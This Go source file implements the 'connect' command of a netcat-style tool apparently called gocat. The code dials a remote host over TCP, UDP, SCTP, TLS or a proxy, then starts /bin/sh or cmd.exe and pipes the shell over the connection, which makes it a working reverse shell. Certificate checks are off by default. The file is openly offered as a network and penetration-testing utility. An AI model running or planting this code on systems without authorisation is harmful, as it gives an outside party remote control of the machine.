package cmd

import (
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"io"
	"log"
	"net"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/ibrahmsql/gocat/internal/logger"
	"github.com/ibrahmsql/gocat/internal/network"
	"github.com/spf13/cobra"
	"golang.org/x/net/proxy"
)

var (
	shellPath        string
	timeout          time.Duration
	retryCount       int
	connectKeepAlive bool
	proxyURL         string
	useSSL           bool
	verifyCert       bool
	caCertFile       string
	useUDP           bool
	useSCTP          bool
	forceIPv6        bool
	forceIPv4        bool
	// Global flags for connect
	sendOnly     bool
	recvOnly     bool
	outputFile   string
	hexDumpFile  string
	appendOutput bool
	noShutdown   bool
	// Protocol flags
	telnetMode bool
	crlfMode   bool
	zeroIOMode bool
	// Source flags
	sourceAddress string
	sourcePort    int
)

var connectCmd = &cobra.Command{
	Use:     "connect [host] <port>",
	Aliases: []string{"c"},
	Short:   "Connect to the controlling host",
	Long:    `Connect to a remote host and spawn a reverse shell.`,
	Args:    cobra.RangeArgs(1, 2),
	Run:     runConnect,
}

func init() {
	rootCmd.AddCommand(connectCmd)

	// Set default shell based on OS
	defaultShell := "/bin/sh"
	if runtime.GOOS == "windows" {
		defaultShell = "cmd.exe"
	}

	connectCmd.Flags().StringVar(&shellPath, "shell", defaultShell, "Shell to use for command execution")
	connectCmd.Flags().DurationVar(&timeout, "connect-timeout", 30*time.Second, "Connection timeout")
	connectCmd.Flags().IntVar(&retryCount, "retry", 3, "Number of retry attempts")
	connectCmd.Flags().BoolVar(&connectKeepAlive, "connect-keep-alive", false, "Enable keep-alive")
	connectCmd.Flags().StringVar(&proxyURL, "connect-proxy", "", "Proxy URL (socks5:// or http://)")
	connectCmd.Flags().BoolVar(&useSSL, "connect-ssl", false, "Use SSL/TLS")
	connectCmd.Flags().BoolVar(&verifyCert, "verify-cert", false, "Verify SSL certificate")
	connectCmd.Flags().StringVar(&caCertFile, "ca-cert", "", "CA certificate file")
	connectCmd.Flags().BoolVar(&useUDP, "connect-udp", false, "Use UDP instead of TCP")
	connectCmd.Flags().BoolVar(&forceIPv6, "connect-ipv6", false, "Force IPv6")
	connectCmd.Flags().BoolVar(&forceIPv4, "connect-ipv4", false, "Force IPv4")

	// Mark conflicting flags
	connectCmd.MarkFlagsMutuallyExclusive("connect-ipv4", "connect-ipv6")
}

// runConnect parses command-line arguments and root persistent flags, applies them to the local configuration, and initiates a connection to the target host and port using the configured shell.
// If a single positional argument is provided it is treated as a port and the host defaults to 127.0.0.1. When the "sh-exec" persistent flag is used the specified command is stored in the GOCAT_SH_EXEC environment variable.
// On connection failure the function logs a fatal error and exits the process.
func runConnect(cmd *cobra.Command, args []string) {
	var host, port string

	if len(args) == 1 {
		host = "127.0.0.1"
		port = args[0]
	} else {
		host = args[0]
		port = args[1]
	}

	// Override local flags with global flags if set
	if globalSSL, _ := cmd.Root().PersistentFlags().GetBool("ssl"); globalSSL {
		useSSL = true
	}
	if globalUDP, _ := cmd.Root().PersistentFlags().GetBool("udp"); globalUDP {
		useUDP = true
	}
	if globalIPv4, _ := cmd.Root().PersistentFlags().GetBool("ipv4"); globalIPv4 {
		forceIPv4 = true
	}
	if globalIPv6, _ := cmd.Root().PersistentFlags().GetBool("ipv6"); globalIPv6 {
		forceIPv6 = true
	}
	if globalSCTP, _ := cmd.Root().PersistentFlags().GetBool("sctp"); globalSCTP {
		useSCTP = true
	}
	if globalWait, _ := cmd.Root().PersistentFlags().GetDuration("wait"); globalWait > 0 {
		timeout = globalWait
	}
	if globalProxy, _ := cmd.Root().PersistentFlags().GetString("proxy"); globalProxy != "" {
		proxyURL = globalProxy
	}
	if globalSSLVerify, _ := cmd.Root().PersistentFlags().GetBool("ssl-verify"); globalSSLVerify {
		verifyCert = true
	}
	if globalSSLTrust, _ := cmd.Root().PersistentFlags().GetString("ssl-trustfile"); globalSSLTrust != "" {
		caCertFile = globalSSLTrust
	}
	// Execution flags
	if globalExec, _ := cmd.Root().PersistentFlags().GetString("exec"); globalExec != "" {
		shellPath = globalExec
	}
	if globalShExec, _ := cmd.Root().PersistentFlags().GetString("sh-exec"); globalShExec != "" {
		shellPath = "/bin/sh"
		// Store the command to execute
		os.Setenv("GOCAT_SH_EXEC", globalShExec)
	}
	// Data flow control flags
	if globalSendOnly, _ := cmd.Root().PersistentFlags().GetBool("send-only"); globalSendOnly {
		sendOnly = true
	}
	if globalRecvOnly, _ := cmd.Root().PersistentFlags().GetBool("recv-only"); globalRecvOnly {
		recvOnly = true
	}
	if globalNoShutdown, _ := cmd.Root().PersistentFlags().GetBool("no-shutdown"); globalNoShutdown {
		noShutdown = true
	}
	// Output flags
	if globalOutput, _ := cmd.Root().PersistentFlags().GetString("output"); globalOutput != "" {
		outputFile = globalOutput
	}
	if globalHexDump, _ := cmd.Root().PersistentFlags().GetString("hex-dump"); globalHexDump != "" {
		hexDumpFile = globalHexDump
	}
	if globalAppend, _ := cmd.Root().PersistentFlags().GetBool("append-output"); globalAppend {
		appendOutput = true
	}
	// Protocol flags
	if globalTelnet, _ := cmd.Root().PersistentFlags().GetBool("telnet"); globalTelnet {
		telnetMode = true
	}
	if globalCRLF, _ := cmd.Root().PersistentFlags().GetBool("crlf"); globalCRLF {
		crlfMode = true
	}
	if globalZeroIO, _ := cmd.Root().PersistentFlags().GetBool("zero-io"); globalZeroIO {
		zeroIOMode = true
	}
	// Source flags
	if globalSource, _ := cmd.Root().PersistentFlags().GetString("source"); globalSource != "" {
		sourceAddress = globalSource
	}
	if globalSourcePort, _ := cmd.Root().PersistentFlags().GetInt("source-port"); globalSourcePort > 0 {
		sourcePort = globalSourcePort
	}

	if err := connect(host, port, shellPath); err != nil {
		logger.Fatal("Error: %v", err)
	}
}

func connect(host, port, shell string) error {
	address := net.JoinHostPort(host, port)

	// Determine network type
	network := "tcp"
	if useUDP {
		network = "udp"
	} else if useSCTP {
		network = "sctp"
	}
	if forceIPv6 {
		network += "6"
	} else if forceIPv4 {
		network += "4"
	}

	logger.Debug("Connecting to %s using %s protocol", address, network)
	if useSSL {
		logger.Debug("SSL/TLS enabled")
	}
	if proxyURL != "" {
		logger.Debug("Using proxy: %s", proxyURL)
	}

	var conn net.Conn
	var err error

	// Retry logic with exponential backoff
	for attempt := 0; attempt <= retryCount; attempt++ {
		if attempt > 0 {
			backoff := time.Duration(attempt*attempt) * time.Second
			logger.Info("Retrying connection (attempt %d/%d) in %v", attempt, retryCount+1, backoff)
			time.Sleep(backoff)
		}

		conn, err = dialWithOptions(network, address)
		if err == nil {
			break
		}

		if attempt == retryCount {
			return fmt.Errorf("failed to connect to %s after %d attempts: %v", address, retryCount+1, err)
		}
		logger.Warn("Connection attempt %d failed: %v", attempt+1, err)
	}

	defer func() {
		if err := conn.Close(); err != nil {
			logger.Error("Error closing connection: %v", err)
		}
	}()

	// Configure keep-alive for TCP connections
	if connectKeepAlive && !useUDP {
		if tcpConn, ok := conn.(*net.TCPConn); ok {
			if err := tcpConn.SetKeepAlive(true); err != nil {
				logger.Warn("Failed to enable keep-alive: %v", err)
			} else {
				if err := tcpConn.SetKeepAlivePeriod(30 * time.Second); err != nil {
					logger.Warn("Failed to set keep-alive period: %v", err)
				}
			}
		}
	}

	theme := logger.GetCurrentTheme()
	if _, err := theme.Success.Printf("✓ Connected to %s\n", address); err != nil {
		log.Printf("Error printing success message: %v", err)
	}

	if runtime.GOOS == "windows" {
		return connectWindows(conn, shell)
	} else {
		return connectUnix(conn, shell)
	}
}

// dialWithOptions dials the given network and address using the configured options.
// It applies the configured dial timeout, binds the local endpoint to the configured
// source address and port when provided, routes the connection through a configured
// proxy if set, and performs TLS handshake when SSL is enabled.
// It returns the established net.Conn on success or an error on failure.
func dialWithOptions(network, address string) (net.Conn, error) {
	// Handle SCTP separately
	if strings.Contains(network, "sctp") {
		return dialSCTP(network, address)
	}

	var dialer net.Dialer
	dialer.Timeout = timeout

	// Set source address if specified
	if sourceAddress != "" {
		var localAddr net.Addr
		var err error
		if strings.Contains(network, "tcp") {
			localAddr, err = net.ResolveTCPAddr(network, net.JoinHostPort(sourceAddress, fmt.Sprintf("%d", sourcePort)))
		} else if strings.Contains(network, "udp") {
			localAddr, err = net.ResolveUDPAddr(network, net.JoinHostPort(sourceAddress, fmt.Sprintf("%d", sourcePort)))
		}
		if err != nil {
			return nil, fmt.Errorf("failed to resolve local address: %v", err)
		}
		dialer.LocalAddr = localAddr
	}

	// Handle proxy
	if proxyURL != "" {
		return dialWithProxy(network, address, &dialer)
	}

	// Handle SSL/TLS
	if useSSL {
		return dialWithTLS(network, address, &dialer)
	}

	return dialer.Dial(network, address)
}

// dialSCTP establishes an SCTP connection to the given network and address
func dialSCTP(netType, address string) (net.Conn, error) {
	// Check if SCTP is supported
	if !network.IsSCTPSupported() {
		return nil, fmt.Errorf("SCTP protocol not supported on this platform")
	}

	// Parse remote address
	raddr, err := network.ResolveSCTPAddr(netType, address)
	if err != nil {
		return nil, fmt.Errorf("failed to resolve SCTP address: %w", err)
	}

	// Parse local address if specified
	var laddr *network.SCTPAddr
	if sourceAddress != "" {
		localAddress := net.JoinHostPort(sourceAddress, fmt.Sprintf("%d", sourcePort))
		laddr, err = network.ResolveSCTPAddr(netType, localAddress)
		if err != nil {
			return nil, fmt.Errorf("failed to resolve local SCTP address: %w", err)
		}
	}

	// Dial with timeout
	conn, err := network.DialSCTPTimeout(netType, laddr, raddr, timeout, nil)
	if err != nil {
		return nil, fmt.Errorf("SCTP dial failed: %w", err)
	}

	return conn, nil
}

func dialWithProxy(network, address string, dialer *net.Dialer) (net.Conn, error) {
	proxyParsed, err := url.Parse(proxyURL)
	if err != nil {
		return nil, fmt.Errorf("invalid proxy URL: %v", err)
	}

	switch proxyParsed.Scheme {
	case "socks5":
		proxySocks5, err := proxy.SOCKS5("tcp", proxyParsed.Host, nil, dialer)
		if err != nil {
			return nil, fmt.Errorf("failed to create SOCKS5 proxy: %v", err)
		}
		return proxySocks5.Dial(network, address)
	case "http", "https":
		// For HTTP proxy, we need to use HTTP CONNECT method
		return dialWithHTTPProxy(network, address, proxyParsed, dialer)
	default:
		return nil, fmt.Errorf("unsupported proxy scheme: %s", proxyParsed.Scheme)
	}
}

func dialWithHTTPProxy(network, address string, proxyURL *url.URL, dialer *net.Dialer) (net.Conn, error) {
	// Connect to proxy
	proxyConn, err := dialer.Dial(network, proxyURL.Host)
	if err != nil {
		return nil, fmt.Errorf("failed to connect to proxy: %v", err)
	}

	// Send CONNECT request
	connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", address, address)
	_, err = proxyConn.Write([]byte(connectReq))
	if err != nil {
		if closeErr := proxyConn.Close(); closeErr != nil {
			log.Printf("Error closing proxy connection: %v", closeErr)
		}
		return nil, fmt.Errorf("failed to send CONNECT request: %v", err)
	}

	// Read response
	buffer := make([]byte, 1024)
	n, err := proxyConn.Read(buffer)
	if err != nil {
		if closeErr := proxyConn.Close(); closeErr != nil {
			log.Printf("Error closing proxy connection: %v", closeErr)
		}
		return nil, fmt.Errorf("failed to read proxy response: %v", err)
	}

	response := string(buffer[:n])
	if !strings.Contains(response, "200") {
		if closeErr := proxyConn.Close(); closeErr != nil {
			log.Printf("Error closing proxy connection: %v", closeErr)
		}
		return nil, fmt.Errorf("proxy connection failed: %s", response)
	}

	return proxyConn, nil
}

// dialWithTLS establishes a TLS connection to the given network and address using the provided dialer.
// It configures TLS with a minimum version of TLS 1.2 and sets InsecureSkipVerify according to verifyCert,
// optionally loads a CA bundle from caCertFile, and applies persistent flags for server name, cipher suites,
// and ALPN protocols.
// It returns a TLS-wrapped net.Conn on success or an error if configuration or handshake fails.
func dialWithTLS(network, address string, dialer *net.Dialer) (net.Conn, error) {
	tlsConfig := &tls.Config{
		InsecureSkipVerify: !verifyCert,
		MinVersion:         tls.VersionTLS12, // Secure minimum TLS version
	}

	// Load CA certificate if provided
	if caCertFile != "" {
		caCert, err := os.ReadFile(caCertFile)
		if err != nil {
			return nil, fmt.Errorf("failed to read CA certificate: %v", err)
		}
		caCertPool := x509.NewCertPool()
		if !caCertPool.AppendCertsFromPEM(caCert) {
			return nil, fmt.Errorf("failed to parse CA certificate")
		}
		tlsConfig.RootCAs = caCertPool
	}

	// Advanced SSL/TLS features from global flags
	if sslServerName, _ := rootCmd.PersistentFlags().GetString("ssl-servername"); sslServerName != "" {
		tlsConfig.ServerName = sslServerName
	}

	if sslCiphers, _ := rootCmd.PersistentFlags().GetString("ssl-ciphers"); sslCiphers != "" {
		// Parse cipher suites
		cipherSuites := parseCipherSuites(sslCiphers)
		if len(cipherSuites) > 0 {
			tlsConfig.CipherSuites = cipherSuites
		}
	}

	if sslALPN, _ := rootCmd.PersistentFlags().GetString("ssl-alpn"); sslALPN != "" {
		// Parse ALPN protocols
		protocols := strings.Split(sslALPN, ",")
		for i, proto := range protocols {
			protocols[i] = strings.TrimSpace(proto)
		}
		tlsConfig.NextProtos = protocols
	}

	return tls.DialWithDialer(dialer, network, address, tlsConfig)
}

// parseCipherSuites converts cipher suite names to IDs
func parseCipherSuites(ciphers string) []uint16 {
	cipherMap := map[string]uint16{
		"TLS_RSA_WITH_AES_128_CBC_SHA":            tls.TLS_RSA_WITH_AES_128_CBC_SHA,
		"TLS_RSA_WITH_AES_256_CBC_SHA":            tls.TLS_RSA_WITH_AES_256_CBC_SHA,
		"TLS_RSA_WITH_AES_128_GCM_SHA256":         tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
		"TLS_RSA_WITH_AES_256_GCM_SHA384":         tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
		"TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA":      tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
		"TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA":      tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
		"TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256":   tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		"TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384":   tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		"TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA":    tls.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA,
		"TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA":    tls.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA,
		"TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256": tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
		"TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384": tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
	}

	cipherNames := strings.Split(ciphers, ":")
	var result []uint16
	for _, name := range cipherNames {
		name = strings.TrimSpace(name)
		if id, exists := cipherMap[name]; exists {
			result = append(result, id)
		}
	}
	return result
}

// handleDataFlowControl implements send-only and recv-only modes
func handleDataFlowControl(conn net.Conn) error {
	var outputWriter io.Writer = os.Stdout
	var inputReader io.Reader = os.Stdin

	// Setup output file if specified
	if outputFile != "" {
		file, err := openOutputFile(outputFile, appendOutput)
		if err != nil {
			return fmt.Errorf("failed to open output file: %v", err)
		}
		defer file.Close()
		outputWriter = file
	}

	// Setup hex dump file if specified
	if hexDumpFile != "" {
		hexFile, err := openOutputFile(hexDumpFile, appendOutput)
		if err != nil {
			return fmt.Errorf("failed to open hex dump file: %v", err)
		}
		defer hexFile.Close()
		outputWriter = &hexDumper{writer: hexFile, original: outputWriter}
	}

	if sendOnly {
		logger.Debug("Send-only mode: copying stdin to connection")
		_, err := io.Copy(conn, inputReader)
		if err != nil && !noShutdown {
			return fmt.Errorf("send-only copy error: %v", err)
		}
		return nil
	}

	if recvOnly {
		logger.Debug("Recv-only mode: copying connection to stdout")
		_, err := io.Copy(outputWriter, conn)
		if err != nil {
			return fmt.Errorf("recv-only copy error: %v", err)
		}
		return nil
	}

	return nil
}

// openOutputFile opens a file for output with append mode support
func openOutputFile(filename string, append bool) (*os.File, error) {
	flags := os.O_CREATE | os.O_WRONLY
	if append {
		flags |= os.O_APPEND
	} else {
		flags |= os.O_TRUNC
	}
	return os.OpenFile(filename, flags, 0644)
}

// hexDumper implements hex dump output
type hexDumper struct {
	writer   io.Writer
	original io.Writer
	offset   int64
}

func (h *hexDumper) Write(p []byte) (n int, err error) {
	// Write to original output if exists
	if h.original != nil {
		if _, err := h.original.Write(p); err != nil {
			return 0, fmt.Errorf("failed to write to original output: %v", err)
		}
	}

	// Write hex dump
	for i := 0; i < len(p); i += 16 {
		end := i + 16
		if end > len(p) {
			end = len(p)
		}

		// Write offset
		fmt.Fprintf(h.writer, "%08x  ", h.offset+int64(i))

		// Write hex bytes
		for j := i; j < end; j++ {
			fmt.Fprintf(h.writer, "%02x ", p[j])
		}

		// Pad if necessary
		for j := end; j < i+16; j++ {
			fmt.Fprintf(h.writer, "   ")
		}

		// Write ASCII representation
		fmt.Fprintf(h.writer, " |")
		for j := i; j < end; j++ {
			if p[j] >= 32 && p[j] <= 126 {
				fmt.Fprintf(h.writer, "%c", p[j])
			} else {
				fmt.Fprintf(h.writer, ".")
			}
		}
		fmt.Fprintf(h.writer, "|\n")
	}

	h.offset += int64(len(p))
	return len(p), nil
}

func connectWindows(conn net.Conn, shell string) error {
	// Handle data flow control modes
	if sendOnly || recvOnly {
		return handleDataFlowControl(conn)
	}

	// Create shell command
	cmd := exec.Command(shell)

	// Get pipes for stdin, stdout, stderr
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return fmt.Errorf("failed to create stdin pipe: %v", err)
	}

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return fmt.Errorf("failed to create stdout pipe: %v", err)
	}

	stderr, err := cmd.StderrPipe()
	if err != nil {
		return fmt.Errorf("failed to create stderr pipe: %v", err)
	}

	// Start the shell
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("failed to start shell: %v", err)
	}

	// Copy data between connection and shell pipes with output handling
	var outputWriter io.Writer = conn
	if outputFile != "" || hexDumpFile != "" {
		outputWriter = createOutputWriter(conn)
	}

	go func() {
		if !recvOnly {
			if _, err := io.Copy(stdin, conn); err != nil {
				logger.Error("conn to stdin copy error: %v", err)
			}
		}
		if err := stdin.Close(); err != nil {
			logger.Error("Error closing stdin: %v", err)
		}
	}()

	go func() {
		if !sendOnly {
			if _, err := io.Copy(outputWriter, stdout); err != nil {
				logger.Error("stdout to conn copy error: %v", err)
			}
		}
	}()

	go func() {
		if !sendOnly {
			if _, err := io.Copy(outputWriter, stderr); err != nil {
				logger.Error("stderr to conn copy error: %v", err)
			}
		}
	}()

	// Wait for the shell to exit
	if err := cmd.Wait(); err != nil {
		logger.Warn("Shell exited with error: %v", err)
	} else {
		logger.Warn("Shell exited")
	}

	return nil
}

// createOutputWriter creates appropriate output writer based on flags
func createOutputWriter(defaultWriter io.Writer) io.Writer {
	var writer io.Writer = defaultWriter

	if outputFile != "" {
		file, err := openOutputFile(outputFile, appendOutput)
		if err != nil {
			logger.Error("Failed to open output file: %v", err)
			return defaultWriter
		}
		writer = file
	}

	if hexDumpFile != "" {
		hexFile, err := openOutputFile(hexDumpFile, appendOutput)
		if err != nil {
			logger.Error("Failed to open hex dump file: %v", err)
			return writer
		}
		writer = &hexDumper{writer: hexFile, original: writer}
	}

	return writer
}